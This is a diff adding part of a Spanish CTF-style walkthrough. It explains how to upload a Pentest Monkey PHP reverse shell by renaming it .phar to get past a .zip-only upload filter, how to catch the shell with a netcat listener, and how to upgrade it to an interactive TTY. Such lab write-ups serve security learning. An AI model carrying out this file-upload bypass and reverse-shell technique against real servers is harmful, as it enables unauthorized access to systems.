@@ -63,4 +63,64 @@ Generamos la reverseshell utilizando **Pentest Monkey**, una herramienta popular
 
 [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
+![image](https://github.com/user-attachments/assets/7ba3c413-256e-48b2-b434-9fca77db2d73)
+
+Cuando la tengamos solo tenemos que subirla, pero parece que no nos deja subirla ya que solo deja .zip.
+
+![image](https://github.com/user-attachments/assets/f7b85846-e2e9-4dff-b083-2c1b478de955)
+
+Investigando un poco vemos que hay mas extension que son php pero terminan en .php. Para mas informacion visitar esta pagina [File Upload General Methodology](https://book.hacktricks.xyz/pentesting-web/file-upload).
+
+Probaremos con la extension .phar 
+
+![image](https://github.com/user-attachments/assets/c3c37cb1-9ba7-4c66-be51-31a72fe72f13)
+
+La pagina no restringe la entrada de archivos `.phar`.
+
+![image](https://github.com/user-attachments/assets/cd57b64d-5ae7-487b-814e-e38f8a675981)
+
+Ya solo falta cargar la ruta donde este el shell.phar, la cual esta en `/uploads/`. Mientras debemso de estar en escucha por el puerto que hallamos definido en el `shell.phar`.
+
+![image](https://github.com/user-attachments/assets/2f29cb10-beea-47f2-a7a8-0f8733b18934)
+
+```bash
+nc lvnp 4444
+```
+Solo faltaria abrir en la pagina el archivo `shell.phar` y ya estariamos dentro.
+
+![image](https://github.com/user-attachments/assets/b56d8709-69f1-4589-a5bf-565975ee2333)
+
+
+### TTY ReverseShell
+
+#### Iniciar una sesión de shell interactiva
+En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
+```bash
+script /dev/null -c bash
+```
+#### Suspender la shell
+Una vez que el comando anterior está en ejecución, utilizamos
+```bash
+Control+Z
+```
+para suspender temporalmente nuestra shell.
+
+#### Preparar nuestro terminal local:
+Antes de volver a nuestra shell, configuramos nuestro terminal local:
+```bash
+stty raw -echo; fg
+```
+
+#### Resetear la configuración del terminal
+Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
+```bash
+reset
+```
+
+#### Configura el tipo de terminal:
+```bash
+xterm
+export TERM=xterm
+export SHELL=bash
+```
 
